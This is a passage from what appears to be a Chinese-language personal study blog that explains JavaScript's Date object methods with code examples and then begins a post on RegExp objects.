<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">15</span>)</span><br><span class="line"><span class="comment">// Tue Apr 01 2014 00:00:00 GMT+0800 (CST)</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment">// Mon Dec 31 2012 00:00:00 GMT+0800 (CST)</span></span><br></pre></td></tr></table></figure>
<p>上面代码的第二个例子，日期设为<code>0</code>，就代表上个月的最后一天。</p>
<p>参数还可以使用负数，表示扣去的时间。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, -<span class="number">1</span>)</span><br><span class="line"><span class="comment">// Sat Dec 01 2012 00:00:00 GMT+0800 (CST)</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>, -<span class="number">1</span>)</span><br><span class="line"><span class="comment">// Sun Dec 30 2012 00:00:00 GMT+0800 (CST)</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，分别对月和日使用了负数，表示从基准日扣去相应的时间</p>
<h4 id="9-3-日期的运算"><a href="#9-3-日期的运算" class="headerlink" title="9.3 日期的运算"></a>9.3 日期的运算</h4><p>类型自动转换时，<code>Date</code>实例如果转为数值，则等于对应的毫秒数；如果转为字符串，则等于对应的日期字符串。所以，两个日期实例对象进行减法运算时，返回的是它们间隔的毫秒数；进行加法运算时，返回的是两个字符串连接而成的新字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d1 = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2000</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> d2 = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2000</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">d2 - d1</span><br><span class="line"><span class="comment">// 2678400000</span></span><br><span class="line">d2 + d1</span><br><span class="line"><span class="comment">// &quot;Sat Apr 01 2000 00:00:00 GMT+0800 (CST)Wed Mar 01 2000 00:00:00 GMT+0800 (CST)&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="9-4-静态方法"><a href="#9-4-静态方法" class="headerlink" title="9.4 静态方法"></a>9.4 静态方法</h4><h5 id="9-4-1-Date-now"><a href="#9-4-1-Date-now" class="headerlink" title="9.4.1 Date.now()"></a>9.4.1 Date.now()</h5><p><code>Date.now</code>方法返回当前时间距离时间零点（1970年1月1日 00:00:00 UTC）的毫秒数，相当于 Unix 时间戳乘以1000。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Date</span>.now() <span class="comment">// 1364026285194</span></span><br></pre></td></tr></table></figure>
<h5 id="9-4-2-Date-parse"><a href="#9-4-2-Date-parse" class="headerlink" title="9.4.2 Date.parse()"></a>9.4.2 Date.parse()</h5><p><code>Date.parse</code>方法用来解析日期字符串，返回该时间距离时间零点（1970年1月1日 00:00:00）的毫秒数。<br>日期字符串应该符合 RFC 2822 和 ISO 8061 这两个标准，即<code>YYYY-MM-DDTHH:mm:ss.sssZ</code>格式，其中最后的<code>Z</code>表示时区。但是，其他格式也可以被解析，请看下面的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Date</span>.parse(<span class="string">&#x27;Aug 9, 1995&#x27;</span>)</span><br><span class="line"><span class="built_in">Date</span>.parse(<span class="string">&#x27;January 26, 2011 13:51:50&#x27;</span>)</span><br><span class="line"><span class="built_in">Date</span>.parse(<span class="string">&#x27;Mon, 25 Dec 1995 13:30:00 GMT&#x27;</span>)</span><br><span class="line"><span class="built_in">Date</span>.parse(<span class="string">&#x27;Mon, 25 Dec 1995 13:30:00 +0430&#x27;</span>)</span><br><span class="line"><span class="built_in">Date</span>.parse(<span class="string">&#x27;2011-10-10&#x27;</span>)</span><br><span class="line"><span class="built_in">Date</span>.parse(<span class="string">&#x27;2011-10-10T14:48:00&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>上面的日期字符串都可以解析。<br>如果解析失败，返回<code>NaN</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Date</span>.parse(<span class="string">&#x27;xxx&#x27;</span>) <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<h5 id="9-4-3-Date-UTC"><a href="#9-4-3-Date-UTC" class="headerlink" title="9.4.3 Date.UTC()"></a>9.4.3 Date.UTC()</h5><p><code>Date.UTC</code>方法接受年、月、日等变量作为参数，返回该时间距离时间零点（1970年1月1日 00:00:00 UTC）的毫秒数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 格式</span></span><br><span class="line"><span class="built_in">Date</span>.UTC(year, month[, date[, hrs[, min[, sec[, ms]]]]])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用法</span></span><br><span class="line"><span class="built_in">Date</span>.UTC(<span class="number">2011</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">567</span>)</span><br><span class="line"><span class="comment">// 1293847384567</span></span><br></pre></td></tr></table></figure>
<p>该方法的参数用法与<code>Date</code>构造函数完全一致，比如月从0开始计算，日期从1开始计算。区别在于<code>Date.UTC</code>方法的参数，会被解释为 UTC 时间（世界标准时间），<code>Date</code>构造函数的参数会被解释为当前时区的时间。</p>
<h4 id="9-5-实例方法"><a href="#9-5-实例方法" class="headerlink" title="9.5 实例方法"></a>9.5 实例方法</h4><p><code>Date</code>的实例对象，有几十个自己的方法，除了<code>valueOf</code>和<code>toString</code>，可以分为以下三类。</p>
<ul>
<li><code>to</code>类：从<code>Date</code>对象返回一个字符串，表示指定的时间。</li>
<li><code>get</code>类：获取<code>Date</code>对象的日期和时间。</li>
<li><code>set</code>类：设置<code>Date</code>对象的日期和时间。</li>
</ul>
<h5 id="9-5-1-Date-prototype-valueOf"><a href="#9-5-1-Date-prototype-valueOf" class="headerlink" title="9.5.1 Date.prototype.valueOf()"></a>9.5.1 Date.prototype.valueOf()</h5><p><code>valueOf</code>方法返回实例对象距离时间零点（1970年1月1日00:00:00 UTC）对应的毫秒数，该方法等同于<code>getTime</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"></span><br><span class="line">d.valueOf() <span class="comment">// 1362790014817</span></span><br><span class="line">d.getTime() <span class="comment">// 1362790014817</span></span><br></pre></td></tr></table></figure>
<p>预期为数值的场合，<code>Date</code>实例会自动调用该方法，所以可以用下面的方法计算时间的间隔</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> start = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> end = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="keyword">var</span> elapsed = end - start;</span><br></pre></td></tr></table></figure>
<h5 id="9-5-2-to-类方法"><a href="#9-5-2-to-类方法" class="headerlink" title="9.5.2 to 类方法"></a>9.5.2 to 类方法</h5><h6 id="1-Date-prototype-toString"><a href="#1-Date-prototype-toString" class="headerlink" title="(1)Date.prototype.toString()"></a>(1)Date.prototype.toString()</h6><p><code>toString</code>方法返回一个完整的日期字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">d.toString()</span><br><span class="line"><span class="comment">// &quot;Tue Jan 01 2013 00:00:00 GMT+0800 (CST)&quot;</span></span><br><span class="line">d</span><br><span class="line"><span class="comment">// &quot;Tue Jan 01 2013 00:00:00 GMT+0800 (CST)&quot;</span></span><br></pre></td></tr></table></figure>
<p>因为<code>toString</code>是默认的调用方法，所以如果直接读取<code>Date</code>实例，就相当于调用这个方法</p>
<h6 id="2-Date-prototype-toUTCString"><a href="#2-Date-prototype-toUTCString" class="headerlink" title="(2)Date.prototype.toUTCString()"></a>(2)Date.prototype.toUTCString()</h6><p>toUTCString方法返回对应的 UTC 时间，也就是比北京时间晚8个小时。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">d.toUTCString()</span><br><span class="line"><span class="comment">// &quot;Mon, 31 Dec 2012 16:00:00 GMT&quot;</span></span><br></pre></td></tr></table></figure>
<h6 id="3-Date-prototype-toISOString"><a href="#3-Date-prototype-toISOString" class="headerlink" title="(3)Date.prototype.toISOString()"></a>(3)Date.prototype.toISOString()</h6><p><code>toISOString</code>方法返回对应时间的 ISO8601 写法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">d.toISOString()</span><br><span class="line"><span class="comment">// &quot;2012-12-31T16:00:00.000Z&quot;</span></span><br></pre></td></tr></table></figure>
<p>注意，<code>toISOString</code>方法返回的总是 UTC 时区的时间</p>
<h6 id="4-Date-prototype-toJSON"><a href="#4-Date-prototype-toJSON" class="headerlink" title="(4)Date.prototype.toJSON()"></a>(4)Date.prototype.toJSON()</h6><p><code>toJSON</code>方法返回一个符合 JSON 格式的 ISO 日期字符串，与<code>toISOString</code>方法的返回结果完全相同。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">d.toJSON()</span><br><span class="line"><span class="comment">// &quot;2012-12-31T16:00:00.000Z&quot;</span></span><br></pre></td></tr></table></figure>
<h6 id="5-Date-prototype-toDateString"><a href="#5-Date-prototype-toDateString" class="headerlink" title="(5)Date.prototype.toDateString()"></a>(5)Date.prototype.toDateString()</h6><p><code>toDateString</code>方法返回日期字符串（不含小时、分和秒）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">d.toDateString() <span class="comment">// &quot;Tue Jan 01 2013&quot;</span></span><br></pre></td></tr></table></figure>
<h6 id="6-Date-prototype-toTimeString"><a href="#6-Date-prototype-toTimeString" class="headerlink" title="(6)Date.prototype.toTimeString()"></a>(6)Date.prototype.toTimeString()</h6><p><code>toTimeString</code>方法返回时间字符串（不含年月日）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">d.toTimeString() <span class="comment">// &quot;00:00:00 GMT+0800 (CST)&quot;</span></span><br></pre></td></tr></table></figure>
<h6 id="7-本地时间"><a href="#7-本地时间" class="headerlink" title="(7)本地时间"></a>(7)本地时间</h6><p>以下三种方法，可以将 Date 实例转为表示本地时间的字符串。</p>
<ul>
<li><code>Date.prototype.toLocaleString()</code>：完整的本地时间。</li>
<li><code>Date.prototype.toLocaleDateString()</code>：本地日期（不含小时、分和秒）。</li>
<li><code>Date.prototype.toLocaleTimeString()</code>：本地时间（不含年月日）。<br>下面是用法实例。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">d.toLocaleString()</span><br><span class="line"><span class="comment">// 中文版浏览器为&quot;2013年1月1日 上午12:00:00&quot;</span></span><br><span class="line"><span class="comment">// 英文版浏览器为&quot;1/1/2013 12:00:00 AM&quot;</span></span><br><span class="line"></span><br><span class="line">d.toLocaleDateString()</span><br><span class="line"><span class="comment">// 中文版浏览器为&quot;2013年1月1日&quot;</span></span><br><span class="line"><span class="comment">// 英文版浏览器为&quot;1/1/2013&quot;</span></span><br><span class="line"></span><br><span class="line">d.toLocaleTimeString()</span><br><span class="line"><span class="comment">// 中文版浏览器为&quot;上午12:00:00&quot;</span></span><br><span class="line"><span class="comment">// 英文版浏览器为&quot;12:00:00 AM&quot;</span></span><br></pre></td></tr></table></figure>
这三个方法都有两个可选的参数<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">dateObj.toLocaleString([locales[, options]])</span><br><span class="line">dateObj.toLocaleDateString([locales[, options]])</span><br><span class="line">dateObj.toLocaleTimeString([locales[, options]])</span><br></pre></td></tr></table></figure>
这两个参数中，<code>locales</code>是一个指定所用语言的字符串，<code>options</code>是一个配置对象。下面是<code>locales</code>的例子，分别采用<code>en-US</code>和<code>zh-CN</code>语言设定<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">d.toLocaleString(<span class="string">&#x27;en-US&#x27;</span>) <span class="comment">// &quot;1/1/2013, 12:00:00 AM&quot;</span></span><br><span class="line">d.toLocaleString(<span class="string">&#x27;zh-CN&#x27;</span>) <span class="comment">// &quot;2013/1/1 上午12:00:00&quot;</span></span><br><span class="line"></span><br><span class="line">d.toLocaleDateString(<span class="string">&#x27;en-US&#x27;</span>) <span class="comment">// &quot;1/1/2013&quot;</span></span><br><span class="line">d.toLocaleDateString(<span class="string">&#x27;zh-CN&#x27;</span>) <span class="comment">// &quot;2013/1/1&quot;</span></span><br><span class="line"></span><br><span class="line">d.toLocaleTimeString(<span class="string">&#x27;en-US&#x27;</span>) <span class="comment">// &quot;12:00:00 AM&quot;</span></span><br><span class="line">d.toLocaleTimeString(<span class="string">&#x27;zh-CN&#x27;</span>) <span class="comment">// &quot;上午12:00:00&quot;</span></span><br></pre></td></tr></table></figure>
<code>options</code>配置对象有以下属性。</li>
</ul>
<p><code>dateStyle</code>：可能的值为<code>full</code>、<code>long</code>、<code>medium</code>、<code>short</code>。<br><code>timeStyle</code>：可能的值为<code>full</code>、<code>long</code>、<code>medium</code>、<code>short</code>。<br><code>month</code>：可能的值为<code>numeric</code>、<code>2-digit</code>、<code>long</code>、<code>short</code>、<code>narrow</code>。<br><code>year</code>：可能的值为<code>numeric</code>、<code>2-digit</code>。<br><code>weekday</code>：可能的值为<code>long</code>、<code>short</code>、<code>narrow</code>。<br><code>day、hour、minute、second</code>：可能的值为<code>numeric</code>、<code>2-digit</code>。<br><code>timeZone</code>：可能的值为 IANA 的时区数据库。<br><code>timeZooneName</code>：可能的值为<code>long</code>、<code>short</code>。<br><code>hour12</code>：24小时周期还是12小时周期，可能的值为<code>true</code>、<code>false</code>。<br>下面是用法实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">d.toLocaleDateString(<span class="string">&#x27;en-US&#x27;</span>, &#123;</span><br><span class="line">  weekday: <span class="string">&#x27;long&#x27;</span>,</span><br><span class="line">  year: <span class="string">&#x27;numeric&#x27;</span>,</span><br><span class="line">  month: <span class="string">&#x27;long&#x27;</span>,</span><br><span class="line">  day: <span class="string">&#x27;numeric&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// &quot;Tuesday, January 1, 2013&quot;</span></span><br><span class="line"></span><br><span class="line">d.toLocaleDateString(<span class="string">&#x27;en-US&#x27;</span>, &#123;</span><br><span class="line">  day: <span class="string">&quot;2-digit&quot;</span>,</span><br><span class="line">  month: <span class="string">&quot;long&quot;</span>,</span><br><span class="line">  year: <span class="string">&quot;2-digit&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// &quot;January 01, 13&quot;</span></span><br><span class="line"></span><br><span class="line">d.toLocaleTimeString(<span class="string">&#x27;en-US&#x27;</span>, &#123;</span><br><span class="line">  timeZone: <span class="string">&#x27;UTC&#x27;</span>,</span><br><span class="line">  timeZoneName: <span class="string">&#x27;short&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// &quot;4:00:00 PM UTC&quot;</span></span><br><span class="line"></span><br><span class="line">d.toLocaleTimeString(<span class="string">&#x27;en-US&#x27;</span>, &#123;</span><br><span class="line">  timeZone: <span class="string">&#x27;Asia/Shanghai&#x27;</span>,</span><br><span class="line">  timeZoneName: <span class="string">&#x27;long&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// &quot;12:00:00 AM China Standard Time&quot;</span></span><br><span class="line"></span><br><span class="line">d.toLocaleTimeString(<span class="string">&#x27;en-US&#x27;</span>, &#123;</span><br><span class="line">  hour12: <span class="literal">false</span></span><br><span class="line">&#125;)<span class="string">`</span></span><br><span class="line"><span class="string">// &quot;00:00:00&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">d.toLocaleTimeString(&#x27;en-US&#x27;, &#123;</span></span><br><span class="line"><span class="string">  hour12: true</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">// &quot;12:00:00 AM&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="9-5-3-get-类方法"><a href="#9-5-3-get-类方法" class="headerlink" title="9.5.3 get 类方法"></a>9.5.3 get 类方法</h5><p><code>Date</code>对象提供了一系列<code>get*</code>方法，用来获取实例对象某个方面的值。</p>
<ul>
<li><code>getTime()</code>：返回实例距离1970年1月1日00:00:00的毫秒数，等同于valueOf方法。</li>
<li><code>getDate()</code>：返回实例对象对应每个月的几号（从1开始）。</li>
<li><code>getDay()</code>：返回星期几，星期日为0，星期一为1，以此类推。</li>
<li><code>getFullYear()</code>：返回四位的年份。</li>
<li><code>getMonth()</code>：返回月份（0表示1月，11表示12月）。</li>
<li><code>getHours()</code>：返回小时（0-23）。</li>
<li><code>getMilliseconds()</code>：返回毫秒（0-999）。</li>
<li><code>getMinutes()</code>：返回分钟（0-59）。</li>
<li><code>getSeconds()</code>：返回秒（0-59）。</li>
<li><code>getTimezoneOffset()</code>：返回当前时间与 UTC 的时区差异，以分钟表示，返回结果考虑到了夏令时因素。</li>
</ul>
<p>所有这些<code>get*</code>方法返回的都是整数，不同方法返回值的范围不一样。</p>
<ul>
<li>分钟和秒：0 到 59</li>
<li>小时：0 到 23</li>
<li>星期：0（星期天）到 6（星期六）</li>
<li>日期：1 到 31</li>
<li>月份：0（一月）到 11（十二月）<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;January 6, 2013&#x27;</span>);</span><br><span class="line"></span><br><span class="line">d.getDate() <span class="comment">// 6</span></span><br><span class="line">d.getMonth() <span class="comment">// 0</span></span><br><span class="line">d.getFullYear() <span class="comment">// 2013</span></span><br><span class="line">d.getTimezoneOffset() <span class="comment">// -480</span></span><br></pre></td></tr></table></figure>
上面代码中，最后一行返回<code>-480</code>，即 UTC 时间减去当前时间，单位是分钟。<code>-480</code>表示 UTC 比当前时间少480分钟，即当前时区比 UTC 早8个小时。<br>下面是一个例子，计算本年度还剩下多少天。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leftDays</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> today = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">  <span class="keyword">var</span> endYear = <span class="keyword">new</span> <span class="built_in">Date</span>(today.getFullYear(), <span class="number">11</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">59</span>, <span class="number">59</span>, <span class="number">999</span>);</span><br><span class="line">  <span class="keyword">var</span> msPerDay = <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.round((endYear.getTime() - today.getTime()) / msPerDay);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
上面这些<code>get*</code>方法返回的都是当前时区的时间，<code>Date</code>对象还提供了这些方法对应的 UTC 版本，用来返回 UTC 时间</li>
<li><code>getUTCDate()</code></li>
<li><code>getUTCFullYear()</code></li>
<li><code>getUTCMonth()</code></li>
<li><code>getUTCDay()</code></li>
<li><code>getUTCHours()</code></li>
<li><code>getUTCMinutes()</code></li>
<li><code>getUTCSeconds()</code></li>
<li><code>getUTCMilliseconds()</code></li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;January 6, 2013&#x27;</span>);</span><br><span class="line"></span><br><span class="line">d.getDate() <span class="comment">// 6</span></span><br><span class="line">d.getUTCDate() <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，实例对象<code>d</code>表示当前时区（东八时区）的1月6日0点0分0秒，这个时间对于当前时区来说是1月6日，所以<code>getDate</code>方法返回6，对于 UTC 时区来说是1月5日，所以<code>getUTCDate</code>方法返回5。</p>
<h5 id="9-5-4-set类方法"><a href="#9-5-4-set类方法" class="headerlink" title="9.5.4 set类方法"></a>9.5.4 set类方法</h5><p><code>Date</code>对象提供了一系列<code>set*</code>方法，用来设置实例对象的各个方面。</p>
<ul>
<li><code>setDate(date)</code>：设置实例对象对应的每个月的几号（1-31），返回改变后毫秒时间戳。</li>
<li><code>setFullYear(year [, month, date])</code>：设置四位年份。</li>
<li><code>setHours(hour [, min, sec, ms])</code>：设置小时（0-23）。</li>
<li><code>setMilliseconds()</code>：设置毫秒（0-999）。</li>
<li><code>setMinutes(min [, sec, ms])</code>：设置分钟（0-59）。</li>
<li><code>setMonth(month [, date])</code>：设置月份（0-11）。</li>
<li><code>setSeconds(sec [, ms])</code>：设置秒（0-59）。</li>
<li><code>setTime(milliseconds)</code>：设置毫秒时间戳。</li>
</ul>
<p>这些方法基本是跟<code>get*</code>方法一一对应的，但是没有<code>setDay</code>方法，因为星期几是计算出来的，而不是设置的。另外，需要注意的是，凡是涉及到设置月份，都是从0开始算的，即<code>0</code>是1月，<code>11</code>是12月。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span> (<span class="string">&#x27;January 6, 2013&#x27;</span>);</span><br><span class="line"></span><br><span class="line">d <span class="comment">// Sun Jan 06 2013 00:00:00 GMT+0800 (CST)</span></span><br><span class="line">d.seDate(<span class="number">9</span>) <span class="comment">// 1357660800000</span></span><br><span class="line">d <span class="comment">// Wed Jan 09 2013 00:00:00 GMT+0800 (CST)</span></span><br></pre></td></tr></table></figure>
<p><code>set*</code>方法的参数都会自动折算。以<code>setDate()</code>为例，如果参数超过当月的最大天数，则向下一个月顺延，如果参数是负数，表示从上个月的最后一天开始减去的天数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d1 = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;January 6, 2013&#x27;</span>);</span><br><span class="line"></span><br><span class="line">d1.setDate(<span class="number">32</span>) <span class="comment">// 1359648000000</span></span><br><span class="line">d1 <span class="comment">// Fri Feb 01 2013 00:00:00 GMT+0800 (CST)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d2 = <span class="keyword">new</span> <span class="built_in">Date</span> (<span class="string">&#x27;January 6, 2013&#x27;</span>);</span><br><span class="line"></span><br><span class="line">d2.setDate(-<span class="number">1</span>) <span class="comment">// 1356796800000</span></span><br><span class="line">d2 <span class="comment">// Sun Dec 30 2012 00:00:00 GMT+0800 (CST)</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>d1.setDate(32)</code>将日期设为1月份的32号，因为1月份只有31号，所以自动折算为2月1日。<code>d2.setDate(-1)</code>表示设为上个月的倒数第二天，即12月30日。</p>
<p><code>set</code>类方法和<code>get</code>类方法，可以结合使用，得到相对时间。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将日期向后推1000天</span></span><br><span class="line">d.setDate(d.getDate() + <span class="number">1000</span>);</span><br><span class="line"><span class="comment">// 将时间设为6小时后</span></span><br><span class="line">d.setHours(d.getHours() + <span class="number">6</span>);</span><br><span class="line"><span class="comment">// 将年份设为去年</span></span><br><span class="line">d.setFullYear(d.getFullYear() - <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p><code>set*</code>系列方法除了<code>setTime()</code>，都有对应的 UTC 版本，即设置 UTC 时区的时间。</p>
<ul>
<li><code>setUTCDate()</code></li>
<li><code>setUTCFullYear()</code></li>
<li><code>setUTCHours()</code></li>
<li><code>setUTCMilliseconds()</code></li>
<li><code>setUTCMinutes()</code></li>
<li><code>setUTCMonth()</code></li>
<li><code>setUTCSeconds()</code></li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;January 6, 2013&#x27;</span>);</span><br><span class="line">d.getUTCHours() <span class="comment">// 16</span></span><br><span class="line">d.setUTCHours(<span class="number">22</span>) <span class="comment">// 1357423200000</span></span><br><span class="line">d <span class="comment">// Sun Jan 06 2013 06:00:00 GMT+0800 (CST)</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，本地时区（东八时区）的1月6日0点0分，是 UTC 时区的前一天下午16点。设为 UTC 时区的22点以后，就变为本地时区的上午6点。</p>
<p><code>Well,that&#39;s all for today</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS标准库-Date对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0024</title>
    <url>/2021/05/16/%E6%89%93%E5%8D%A10024/</url>
    <content><![CDATA[<p><font color=#afdfe4>真正重要的东西，总是没有的人比拥有的人清楚。</font></p>
<h2 id="JS标准库"><a href="#JS标准库" class="headerlink" title="JS标准库"></a>JS标准库</h2><h3 id="10-RegExp对象"><a href="#10-RegExp对象" class="headerlink" title="10. RegExp对象"></a>10. RegExp对象</h3><h4 id="10-1-概述"><a href="#10-1-概述" class="headerlink" title="10.1 概述"></a>10.1 概述</h4><p>正则表达式（regular expression）是一种表达文本模式（即字符串结构）的方法，有点像字符串的模板，常常用来按照“给定模式”匹配文本。比如，正则表达式给出一个 Email 地址的模式，然后用它来确定一个字符串是否为 Email 地址。JavaScript 的正则表达式体系是参照 Perl 5 建立的。<br>新建正则表达式有两种方法。一种是使用字面量，以斜杠表示开始和结束。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/xyz/</span>;</span><br></pre></td></tr></table></figure>
<p>另一种是使用<code>RegExp</code>构造函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;xyz&#x27;</span>);</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>上面两种写法是等价的，都新建了一个内容为<code>xyz</code>的正则表达式对象。它们的主要区别是，第一种方法在引擎编译代码时，就会新建正则表达式，第二种方法在运行时新建正则表达式，所以前者的效率较高。而且，前者比较便利和直观，所以实际应用中，基本上都采用字面量定义正则表达式。<br><code>RegExp</code>构造函数还可以接受第二个参数，表示修饰符（详细解释见下文）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;xyz&#x27;</span>, <span class="string">&#x27;i&#x27;</span>);</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/xyz/i</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码中，正则表达式<code>/xyz/</code>有一个修饰符<code>i</code>。</p>
<h4 id="10-2-实例属性"><a href="#10-2-实例属性" class="headerlink" title="10.2 实例属性"></a>10.2 实例属性</h4><p>正则对象的实例属性分成两类。<br>一类是修饰符相关，用于了解设置了什么修饰符。</p>
<ul>
<li><code>RegExp.prototype.ignoreCase</code>：返回一个布尔值，表示是否设置了<code>i</code>修饰符。</li>
<li><code>RegExp.prototype.global</code>：返回一个布尔值，表示是否设置了<code>g</code>修饰符。</li>
<li><code>RegExp.prototype.multiline</code>：返回一个布尔值，表示是否设置了<code>m</code>修饰符。</li>
<li><code>RegExp.prototype.flags</code>：返回一个字符串，包含了已经设置的所有修饰符，按字母排序。</li>
</ul>
<p>上面四个属性都是只读的。</p>
